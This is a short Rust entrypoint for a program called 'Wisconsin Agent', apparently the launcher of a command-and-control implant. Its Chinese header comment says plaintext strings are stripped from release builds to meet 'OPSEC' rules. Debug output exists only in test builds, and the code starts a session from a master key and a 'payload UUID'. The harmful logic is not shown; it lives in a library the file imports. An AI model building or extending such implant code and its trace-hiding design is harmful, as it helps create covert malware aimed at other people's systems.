//! # Wisconsin Agent 引导入口 (Executable Entrypoint)
//!
//! 100% 剥离 Release 明文字符串，遵循零堆分配与 OPSEC 规范。

use std::process::ExitCode;
use wisconsin_lib::config::AgentConfig;
use wisconsin_lib::engine::AgentSession;

fn main() -> ExitCode {
    #[cfg(any(debug_assertions, test))]
    {
        std::println!("Wisconsin Agent Initialized");
    }

    let master_key = AgentConfig::master_key();
    let payload_uuid = AgentConfig::payload_uuid_bytes();

    match AgentSession::new(&master_key, &payload_uuid) {
        Ok(mut session) => {
            session.run();
            ExitCode::SUCCESS
        }
        Err(err) => {
            #[cfg(any(debug_assertions, test))]
            {
                std::eprintln!("AgentSession init failed with error code: {}", err.code());
            }
            ExitCode::from(err.code())
        }
    }
}
